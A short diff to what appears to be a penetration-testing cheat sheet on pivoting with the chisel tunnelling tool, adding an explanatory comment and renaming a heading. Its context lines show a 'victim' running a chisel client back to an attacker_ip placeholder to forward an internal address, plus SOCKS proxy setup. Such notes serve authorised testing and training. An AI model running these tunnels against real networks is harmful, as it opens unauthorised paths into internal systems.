@@ -23,7 +23,7 @@ chisel server -p 9999 --reverse
 
 # Victim
 chisel client <attacker_ip>:9999 R:8090:172.16.22.2:8000
-
+	# in this case, 8090 gets forwarded to internal network ip 172.16.22.2:8000
 ```
 
 Forward Dynamic SOCKS proxy
@@ -39,7 +39,7 @@ chisel server -p 9999 --socks5
 chisel client <victim_ip>:9999 8000:socks
 ```
 
-Reverse Dynamic SOCKS Proxy
+Reverse Dynamic SOCKS Proxy (THE SLIGHTLY SLOWER GOAT)
 ```bash
 # /etc/proxychains.conf
 ...SNIP...
